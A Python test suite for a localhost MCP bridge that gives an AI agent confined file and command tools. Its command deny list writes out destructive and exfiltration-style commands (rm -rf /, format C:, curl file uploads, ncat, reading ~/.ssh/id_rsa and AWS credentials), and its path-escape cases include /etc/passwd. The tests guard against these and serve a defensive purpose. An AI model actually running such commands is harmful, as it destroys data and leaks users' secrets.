"""Tests for the PC bridge: a real Bridge on a temporary project folder,
driven over HTTP on 127.0.0.1 the way an MCP client would."""

from __future__ import annotations

import json
import os
import shutil
import sys
import tempfile
import time
import unittest
import urllib.error
import urllib.request
from concurrent.futures import ThreadPoolExecutor
from pathlib import Path

from cli_subagents.remote.bridge import Bridge, TOOL_NAMES

IS_WINDOWS = os.name == "nt"
TOKEN = "test-token-" + "x" * 20
PY = f'"{sys.executable}"'

_OPENER = urllib.request.build_opener(urllib.request.ProxyHandler({}))


def _post(port, payload, token=TOKEN, headers=None, method="POST", path="/mcp"):
    """Send one request; return (status, headers, parsed body or None)."""
    body = payload if isinstance(payload, bytes) else json.dumps(payload).encode()
    req = urllib.request.Request(f"http://127.0.0.1:{port}{path}",
                                 data=body if method == "POST" else None, method=method)
    req.add_header("Content-Type", "application/json")
    req.add_header("Accept", "application/json, text/event-stream")
    if token is not None:
        req.add_header("Authorization", f"Bearer {token}")
    for k, v in (headers or {}).items():
        req.add_header(k, v)
    try:
        with _OPENER.open(req, timeout=60) as resp:
            status, hdrs, raw = resp.status, resp.headers, resp.read()
    except urllib.error.HTTPError as exc:
        status, hdrs, raw = exc.code, exc.headers, exc.read()
    return status, hdrs, (json.loads(raw) if raw else None)


def _make_link(target: Path, link: Path, is_dir: bool) -> bool:
    """Create a symlink, or on Windows a junction for folders. False if the OS refuses."""
    try:
        os.symlink(target, link, target_is_directory=is_dir)
        return True
    except (OSError, NotImplementedError):
        pass
    if IS_WINDOWS and is_dir:
        try:
            import _winapi
            _winapi.CreateJunction(str(target), str(link))
            return True
        except (OSError, ImportError, AttributeError):
            pass
    return False


class BridgeTestBase(unittest.TestCase):
    output_cap = 100_000

    @classmethod
    def setUpClass(cls):
        cls.tmp = Path(tempfile.mkdtemp(prefix="bridge-test-"))
        cls.root = cls.tmp / "project"
        cls.outside = cls.tmp / "outside"
        cls.root.mkdir()
        cls.outside.mkdir()
        (cls.outside / "outside.txt").write_text("OUTSIDE_CONTENT\n")
        r = cls.root
        (r / "hello.txt").write_text("line one\nline two\nline three\n")
        (r / "src").mkdir()
        (r / "src" / "app.py").write_text("def main():\n    return 'needle'\n")
        (r / "src" / "util.py").write_text("x = 1\n")
        (r / "src" / "deep").mkdir()
        (r / "src" / "deep" / "mod.py").write_text("needle = 2\n")
        (r / "notes.md").write_text("needle in notes\n")
        (r / "bin.dat").write_bytes(b"\x00\x01needle\x02")
        (r / "node_modules").mkdir()
        (r / "node_modules" / "dep.js").write_text("needle\n")
        (r / ".git").mkdir()
        (r / ".git" / "config").write_text("needle\n")
        # Secret files
        (r / ".env").write_text("SECRET_NEEDLE=1\n")
        (r / ".env.local").write_text("SECRET_NEEDLE=2\n")
        (r / "id_rsa").write_text("SECRET_NEEDLE\n")
        (r / "server.pem").write_text("SECRET_NEEDLE\n")
        (r / "aws-credentials.json").write_text('{"k": "SECRET_NEEDLE"}\n')
        (r / ".ssh").mkdir()
        (r / ".ssh" / "config").write_text("SECRET_NEEDLE\n")
        cls.events = []
        cls.bridge = Bridge(r, TOKEN, output_cap=cls.output_cap, audit=cls.events.append,
                            run_timeout_max=60)
        cls.port = cls.bridge.start()

    @classmethod
    def tearDownClass(cls):
        cls.bridge.stop()
        shutil.rmtree(cls.tmp, ignore_errors=True)

    _next_id = 0

    def rpc(self, method, params=None, **kw):
        type(self)._next_id += 1
        msg = {"jsonrpc": "2.0", "id": self._next_id, "method": method}
        if params is not None:
            msg["params"] = params
        return _post(self.port, msg, **kw)

    def call(self, tool, **arguments):
        status, _, body = self.rpc("tools/call", {"name": tool, "arguments": arguments})
        self.assertEqual(status, 200)
        result = body["result"]
        self.assertEqual(result["content"][0]["type"], "text")
        return result["content"][0]["text"], result["isError"]

    def assertRefused(self, tool, **arguments):
        text, is_error = self.call(tool, **arguments)
        self.assertTrue(is_error, text)
        self.assertIn("Refused", text)
        return text


class HttpAndProtocolTests(BridgeTestBase):
    def test_no_token_and_wrong_token(self):
        status, hdrs, _ = self.rpc("ping", token=None)
        self.assertEqual(status, 401)
        status, _, _ = self.rpc("ping", token="wrong")
        self.assertEqual(status, 401)
        status, _, _ = _post(self.port, {"jsonrpc": "2.0", "id": 1, "method": "ping"},
                             headers={"Authorization": "Basic abc"}, token=None)
        self.assertEqual(status, 401)

    def test_initialize(self):
        status, hdrs, body = self.rpc("initialize", {
            "protocolVersion": "2025-06-18", "capabilities": {},
            "clientInfo": {"name": "test", "version": "0"}})
        self.assertEqual(status, 200)
        self.assertTrue(hdrs.get("Content-Type", "").startswith("application/json"))
        self.assertTrue(hdrs.get("Mcp-Session-Id"))
        result = body["result"]
        self.assertEqual(body["jsonrpc"], "2.0")
        self.assertEqual(result["protocolVersion"], "2025-06-18")
        self.assertEqual(result["capabilities"], {"tools": {}})
        self.assertEqual(result["serverInfo"], {"name": "pc", "version": "1"})
        # Older supported version is echoed, unknown version gets the newest.
        _, _, body = self.rpc("initialize", {"protocolVersion": "2024-11-05"})
        self.assertEqual(body["result"]["protocolVersion"], "2024-11-05")
        _, _, body = self.rpc("initialize", {"protocolVersion": "1999-01-01"})
        self.assertEqual(body["result"]["protocolVersion"], "2025-11-25")

    def test_initialized_notification_and_session_header(self):
        status, _, body = _post(self.port, {"jsonrpc": "2.0", "method": "notifications/initialized"},
                                headers={"Mcp-Session-Id": "abc"})
        self.assertEqual(status, 202)
        self.assertIsNone(body)
        status, _, body = self.rpc("ping", headers={"Mcp-Session-Id": "abc"})
        self.assertEqual((status, body["result"]), (200, {}))

    def test_get_other_paths_and_errors(self):
        status, hdrs, _ = _post(self.port, None, method="GET")
        self.assertEqual(status, 405)
        status, _, _ = _post(self.port, {"jsonrpc": "2.0", "id": 1, "method": "ping"}, path="/other")
        self.assertEqual(status, 404)
        status, _, body = _post(self.port, b"{not json")
        self.assertEqual(body["error"]["code"], -32700)
        status, _, body = self.rpc("no/such/method")
        self.assertEqual(body["error"]["code"], -32601)
        status, _, body = self.rpc("tools/call", {"name": "pc_nope", "arguments": {}})
        self.assertEqual(body["error"]["code"], -32602)

    def test_tools_list(self):
        _, _, body = self.rpc("tools/list")
        tools = body["result"]["tools"]
        self.assertEqual(sorted(t["name"] for t in tools), sorted(TOOL_NAMES))
        self.assertEqual(len(tools), 7)
        for tool in tools:
            self.assertEqual(tool["inputSchema"]["type"], "object")
            self.assertIn("properties", tool["inputSchema"])
            self.assertIn("project folder", tool["description"])
            self.assertNotIn("\n", tool["description"])

    def test_concurrent_calls(self):
        def one(i):
            if i % 2:
                return self.call("pc_read", path="hello.txt")
            return self.call("pc_glob", pattern="**/*.py")
        with ThreadPoolExecutor(max_workers=10) as pool:
            results = list(pool.map(one, range(10)))
        self.assertEqual(len(results), 10)
        for text, is_error in results:
            self.assertFalse(is_error, text)

    def test_audit_events(self):
        self.call("pc_read", path="hello.txt")
        self.call("pc_read", path=".env")
        events = list(self.events)
        ok = [e for e in events if e.get("path") == "hello.txt"]
        refused = [e for e in events if e.get("path") == ".env"]
        self.assertTrue(ok and refused)
        self.assertEqual(set(ok[-1]), {"tool", "path", "allowed", "reason"})
        self.assertTrue(ok[-1]["allowed"])
        self.assertFalse(refused[-1]["allowed"])
        for e in events:
            for value in e.values():
                self.assertNotIn("line one", str(value))
                self.assertNotIn("SECRET_NEEDLE", str(value))


class FileToolTests(BridgeTestBase):
    def test_read(self):
        text, err = self.call("pc_read", path="hello.txt")
        self.assertFalse(err)
        self.assertEqual(text.splitlines()[0], "     1\tline one")
        self.assertIn("     3\tline three", text)
        text, _ = self.call("pc_read", path="hello.txt", offset=2, limit=1)
        self.assertIn("     2\tline two", text)
        self.assertNotIn("line one", text)
        self.assertNotIn("line three", text)

    def test_read_binary_large_and_missing(self):
        text, err = self.call("pc_read", path="bin.dat")
        self.assertTrue(err)
        self.assertIn("binary", text)
        big = self.root / "big.txt"
        with open(big, "wb") as fh:
            fh.seek(5 * 1024 * 1024 + 10)
            fh.write(b"x")
        try:
            text, err = self.call("pc_read", path="big.txt")
            self.assertTrue(err)
            self.assertIn("larger", text)
        finally:
            big.unlink()
        _, err = self.call("pc_read", path="missing.txt")
        self.assertTrue(err)

    def test_write_creates_folders(self):
        text, err = self.call("pc_write", path="new/deeper/file.txt", content="hi\nthere\n")
        self.assertFalse(err, text)
        self.assertEqual((self.root / "new" / "deeper" / "file.txt").read_bytes(), b"hi\nthere\n")
        _, err = self.call("pc_write", path="new/deeper/file.txt", content="again")
        self.assertFalse(err)
        self.assertEqual((self.root / "new" / "deeper" / "file.txt").read_text(), "again")

    def test_edit(self):
        p = self.root / "edit_me.txt"
        p.write_text("alpha beta\ngamma beta\n")
        text, err = self.call("pc_edit", path="edit_me.txt", old_string="alpha", new_string="ALPHA")
        self.assertFalse(err, text)
        self.assertEqual(p.read_text(), "ALPHA beta\ngamma beta\n")
        text, err = self.call("pc_edit", path="edit_me.txt", old_string="nothere", new_string="x")
        self.assertTrue(err)
        self.assertIn("not found", text)
        text, err = self.call("pc_edit", path="edit_me.txt", old_string="beta", new_string="B")
        self.assertTrue(err)
        self.assertIn("2 times", text)
        self.assertEqual(p.read_text(), "ALPHA beta\ngamma beta\n")
        _, err = self.call("pc_edit", path="edit_me.txt", old_string="beta", new_string="B",
                           replace_all=True)
        self.assertFalse(err)
        self.assertEqual(p.read_text(), "ALPHA B\ngamma B\n")

    def test_edit_crlf_file(self):
        p = self.root / "crlf.txt"
        p.write_bytes(b"one\r\ntwo\r\n")
        _, err = self.call("pc_edit", path="crlf.txt", old_string="one\ntwo", new_string="1\n2")
        self.assertFalse(err)
        self.assertEqual(p.read_bytes(), b"1\r\n2\r\n")

    def test_list(self):
        text, err = self.call("pc_list")
        self.assertFalse(err)
        names = text.splitlines()
        self.assertIn("hello.txt", names)
        self.assertIn("src/", names)
        text, _ = self.call("pc_list", path="src")
        self.assertIn("app.py", text.splitlines())
        self.assertIn("deep/", text.splitlines())

    def test_glob(self):
        text, err = self.call("pc_glob", pattern="**/*.py")
        self.assertFalse(err)
        self.assertEqual(text.splitlines(), ["src/app.py", "src/deep/mod.py", "src/util.py"])
        text, _ = self.call("pc_glob", pattern="src/*.py")
        self.assertEqual(text.splitlines(), ["src/app.py", "src/util.py"])
        text, _ = self.call("pc_glob", pattern="*.{md,txt}")
        self.assertIn("notes.md", text.splitlines())
        self.assertIn("hello.txt", text.splitlines())
        text, _ = self.call("pc_glob", pattern="**/*.js")
        self.assertNotIn("node_modules", text)
        text, _ = self.call("pc_glob", pattern="**/config")
        self.assertNotIn(".git", text)

    def test_grep(self):
        text, err = self.call("pc_grep", pattern="need+le")
        self.assertFalse(err)
        rows = text.splitlines()
        self.assertIn("src/app.py:2:    return 'needle'", rows)
        self.assertIn("notes.md:1:needle in notes", rows)
        self.assertNotIn("bin.dat", text)
        self.assertNotIn("node_modules", text)
        self.assertNotIn(".git", text)
        text, _ = self.call("pc_grep", pattern="needle", path="src", glob="*.py")
        self.assertEqual(sorted(text.splitlines()),
                         ["src/app.py:2:    return 'needle'", "src/deep/mod.py:1:needle = 2"])
        text, _ = self.call("pc_grep", pattern="needle", path="src/app.py")
        self.assertEqual(text.splitlines(), ["src/app.py:2:    return 'needle'"])
        _, err = self.call("pc_grep", pattern="(unclosed")
        self.assertTrue(err)

    def test_grep_caps_line_length(self):
        (self.root / "long.txt").write_text("needle" + "y" * 5000 + "\n")
        try:
            text, _ = self.call("pc_grep", pattern="needle", path="long.txt")
            self.assertLess(len(text), 400)
            self.assertIn("[line cut]", text)
        finally:
            (self.root / "long.txt").unlink()


class ConfinementTests(BridgeTestBase):
    def test_path_escapes(self):
        self.assertRefused("pc_read", path="../outside/outside.txt")
        self.assertRefused("pc_read", path="src/../../outside/outside.txt")
        self.assertRefused("pc_read", path=str(self.outside / "outside.txt"))
        self.assertRefused("pc_read", path="C:\\Windows\\win.ini")
        self.assertRefused("pc_read", path="C:/Windows/win.ini")
        self.assertRefused("pc_read", path="/etc/passwd")
        self.assertRefused("pc_read", path="~/x")
        self.assertRefused("pc_write", path="../evil.txt", content="x")
        self.assertFalse((self.tmp / "evil.txt").exists())
        self.assertRefused("pc_list", path="..")
        self.assertRefused("pc_grep", pattern="OUTSIDE", path="..")
        self.assertRefused("pc_glob", pattern="../outside/*")
        self.assertRefused("pc_run", command="echo hi", cwd="..")
        # ".." that stays inside is fine.
        _, err = self.call("pc_read", path="src/../hello.txt")
        self.assertFalse(err)

    @unittest.skipUnless(IS_WINDOWS, "Windows path rules")
    def test_windows_specific_paths(self):
        self.assertRefused("pc_read", path="hello.txt:stream")
        self.assertRefused("pc_read", path=".env.")
        self.assertRefused("pc_write", path="nul", content="x")

    def test_link_pointing_outside(self):
        link = self.root / "outlink"
        if not _make_link(self.outside, link, is_dir=True):
            self.skipTest("the OS refused to create a folder link")
        try:
            self.assertRefused("pc_read", path="outlink/outside.txt")
            self.assertRefused("pc_write", path="outlink/new.txt", content="x")
            self.assertFalse((self.outside / "new.txt").exists())
            self.assertRefused("pc_list", path="outlink")
            text, _ = self.call("pc_grep", pattern="OUTSIDE_CONTENT")
            self.assertNotIn("OUTSIDE_CONTENT", text)
            text, _ = self.call("pc_glob", pattern="**/*.txt")
            self.assertNotIn("outside.txt", text)
            reason = self.bridge.command_refusal("rm -rf outlink/*")
            self.assertIsNotNone(reason)
        finally:
            if IS_WINDOWS:
                os.rmdir(link)
            else:
                link.unlink()

    def test_file_link_pointing_outside(self):
        link = self.root / "filelink.txt"
        if not _make_link(self.outside / "outside.txt", link, is_dir=False):
            self.skipTest("the OS refused to create a file link")
        try:
            self.assertRefused("pc_read", path="filelink.txt")
            text, _ = self.call("pc_grep", pattern="OUTSIDE_CONTENT")
            self.assertNotIn("OUTSIDE_CONTENT", text)
        finally:
            link.unlink()

    def test_secret_files_refused(self):
        for path in (".env", ".env.local", ".ENV", "id_rsa", "server.pem",
                     "aws-credentials.json", ".ssh/config", ".ssh"):
            with self.subTest(path=path):
                tool = "pc_list" if path == ".ssh" else "pc_read"
                self.assertRefused(tool, path=path)
        self.assertRefused("pc_write", path=".env", content="x")
        self.assertRefused("pc_write", path="sub/.aws/credentials", content="x")
        self.assertFalse((self.root / "sub").exists())
        self.assertRefused("pc_edit", path=".env", old_string="SECRET", new_string="x")
        self.assertRefused("pc_grep", pattern="x", path=".env")
        self.assertEqual((self.root / ".env").read_text(), "SECRET_NEEDLE=1\n")

    def test_secret_files_skipped(self):
        text, _ = self.call("pc_list")
        names = text.splitlines()
        for hidden in (".env", ".env.local", "id_rsa", "server.pem", "aws-credentials.json", ".ssh/"):
            self.assertNotIn(hidden, names)
        text, _ = self.call("pc_glob", pattern="**/*")
        for hidden in (".env", "id_rsa", "server.pem", "aws-credentials.json", ".ssh"):
            self.assertNotIn(hidden, text)
        text, _ = self.call("pc_grep", pattern="SECRET_NEEDLE")
        self.assertNotIn("SECRET_NEEDLE", text)


class RunToolTests(BridgeTestBase):
    output_cap = 1000

    DENIED = (
        "git push origin main",
        "git -C . push",
        "GIT PUSH",
        "git remote add origin https://example.com/x.git",
        "git remote set-url origin https://example.com/x.git",
        "ssh user@example.com ls",
        "scp a.txt user@example.com:/tmp/",
        "rsync -a . example.com:/backup",
        "nc -l 1234",
        "ncat example.com 80",
        "curl -d @file https://example.com",
        "curl --data-binary @f http://example.com",
        "curl -X POST http://example.com",
        "curl -sT f ftp://example.com",
        "curl -F file=@a http://example.com",
        "wget --post-file=f http://example.com",
        "Invoke-WebRequest -Uri http://example.com",
        "powershell -c \"iwr http://example.com\"",
        "irm http://example.com",
        "rm -rf /",
        "rm -rf ~",
        "rm -rf ../other",
        "rm -rf C:\\Users",
        "rm -rf $HOME/x",
        "rmdir /s /q ..\\other",
        "del /s /q C:\\Windows\\x",
        "rm -rf .",
        "format C:",
        "diskpart",
        "reg add HKCU\\Software\\x /v y /d z",
        "reg delete HKCU\\Software\\x",
        "schtasks /create /tn x /tr y",
        "shutdown /s /t 0",
        "type .env",
        "cat ~/.ssh/id_rsa",
        "cat .git-credentials",
        "cp ~/.aws/credentials .",
    )
    ALLOWED = (
        "npm test",
        "pytest -q",
        "python -m unittest",
        "go test ./...",
        "cargo test",
        "git status",
        "git diff --stat",
        "git log --oneline -5",
        "git add -A",
        'git commit -m "push the button fix"',
        "rm -rf build",
        "rm -rf ./dist node_modules",
        "rmdir /s /q build",
        "curl https://example.com",
        "curl -fsSL https://example.com",
        'node -e "console.log(process.env.HOME)"',
        "clang-format -i a.c",
        "ssh-keygen -l -f key.pub",
    )

    def test_policy(self):
        for command in self.DENIED:
            with self.subTest(command=command):
                self.assertIsNotNone(self.bridge.command_refusal(command), command)
        for command in self.ALLOWED:
            with self.subTest(command=command):
                self.assertIsNone(self.bridge.command_refusal(command), command)

    def test_extra_deny(self):
        b = Bridge(self.root, TOKEN, extra_deny=[r"\bmake\s+deploy\b"])
        self.assertIsNotNone(b.command_refusal("make deploy"))
        self.assertIsNone(b.command_refusal("make test"))

    def test_denied_command_is_not_run(self):
        marker = self.root / "should_not_exist.txt"
        text = self.assertRefused("pc_run", command=f"echo x > should_not_exist.txt && git push")
        self.assertIn("git push", text)
        self.assertFalse(marker.exists())

    def test_run_ok_and_exit_code(self):
        text, err = self.call("pc_run", command=f"{PY} -c \"print('hello from run')\"")
        self.assertFalse(err, text)
        self.assertIn("Exit code: 0", text)
        self.assertIn("hello from run", text)
        text, err = self.call("pc_run", command=f"{PY} -c \"import sys; sys.stderr.write('bad'); sys.exit(3)\"")
        self.assertTrue(err)
        self.assertIn("Exit code: 3", text)
        self.assertIn("bad", text)

    def test_run_cwd(self):
        text, err = self.call("pc_run", command=f"{PY} -c \"import os; print(os.path.basename(os.getcwd()))\"",
                              cwd="src")
        self.assertFalse(err, text)
        self.assertIn("src", text.split("--- stdout ---")[1])

    def test_timeout_kills_tree(self):
        marker = self.root / "late_marker.txt"
        child = ("import time, pathlib; time.sleep(4); "
                 "pathlib.Path('late_marker.txt').write_text('alive')")
        started = time.monotonic()
        text, err = self.call("pc_run", command=f"{PY} -c \"{child}\"", timeout_s=1)
        elapsed = time.monotonic() - started
        self.assertTrue(err)
        self.assertIn("Timed out", text)
        self.assertLess(elapsed, 15)
        time.sleep(5)
        self.assertFalse(marker.exists(), "the child process outlived the timeout")

    def test_output_cap_keeps_head_and_tail(self):
        code = "print('HEAD' + 'x' * 20000 + 'TAIL')"
        text, err = self.call("pc_run", command=f"{PY} -c \"{code}\"")
        self.assertFalse(err, text)
        stdout = text.split("--- stdout ---\n", 1)[1].split("\n--- stderr ---", 1)[0]
        self.assertTrue(stdout.startswith("HEAD"))
        self.assertIn("TAIL", stdout)
        self.assertIn("bytes omitted", stdout)
        self.assertLess(len(stdout), 1200)

    def test_read_output_is_capped(self):
        (self.root / "many.txt").write_text("".join(f"row {i:03} " + "z" * 40 + "\n" for i in range(200)))
        text, err = self.call("pc_read", path="many.txt")
        self.assertFalse(err)
        self.assertLess(len(text), 1200)
        self.assertIn("     1\trow 000", text)
        self.assertRegex(text.splitlines()[-1], r"^\[lines 1-\d+ of 200\]$")

    def test_env_stripping(self):
        names = {"BRIDGE_TEST_API_KEY": "1", "BRIDGE_TEST_TOKEN_X": "1", "BRIDGE_TEST_PASSWORD": "1",
                 "BRIDGE_TEST_SECRET": "1", "ANTHROPIC_BRIDGE_TEST": "1",
                 "CLAUDE_CODE_OAUTH_BRIDGE_TEST": "1", "BRIDGE_TEST_PLAIN": "1"}
        old = {k: os.environ.get(k) for k in names}
        os.environ.update(names)
        try:
            code = "import os; print(sorted(k for k in os.environ if 'BRIDGE_TEST' in k.upper()))"
            text, err = self.call("pc_run", command=f"{PY} -c \"{code}\"")
        finally:
            for k, v in old.items():
                if v is None:
                    os.environ.pop(k, None)
                else:
                    os.environ[k] = v
        self.assertFalse(err, text)
        self.assertIn("['BRIDGE_TEST_PLAIN']", text)


if __name__ == "__main__":
    unittest.main()
